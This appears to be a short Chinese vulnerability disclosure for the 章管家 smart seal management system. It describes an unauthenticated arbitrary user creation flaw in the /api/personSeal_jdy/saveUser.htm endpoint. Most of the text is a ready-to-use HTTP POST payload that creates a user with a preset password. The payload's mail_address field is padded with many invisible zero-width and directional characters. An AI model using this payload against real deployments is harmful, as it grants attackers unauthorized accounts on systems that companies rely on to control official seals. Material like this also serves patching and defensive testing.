**漏洞描述：**

章管家saveUser.htm接口存在任意用户创建漏洞，未授权攻击者可以通过向接口发送请求创建用户。

**影响版本：**

章管家智能印章管理系统

**Payload：**

```jsx
POST /api/personSeal_jdy/saveUser.htm HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: application/json

{"op":{},"data":{"mobile":"14333333333","uid":"14333333333","password":"123456","name":"test","return_url":"https://www.te.st","apisecretkey":"1","_id":"1","mail_address":"‍﻿﻿‏﻿‌‎‎﻿te@***com‏‏‍​‏‏﻿﻿‏﻿﻿‏‌﻿‏‎‎‎‌‎‍‌‎﻿‏‏﻿‎‎‍‍‏‌‌﻿﻿‏﻿﻿‏‏﻿‍﻿‎‌‏‏‎‌‎﻿‍​‏‍‏﻿‎‎‎‍‎﻿‎‌﻿﻿‍​﻿﻿‍﻿‎‍‌‍‌‏‎‎‏﻿"},"b7o4ntosbfp":"="}
```

---
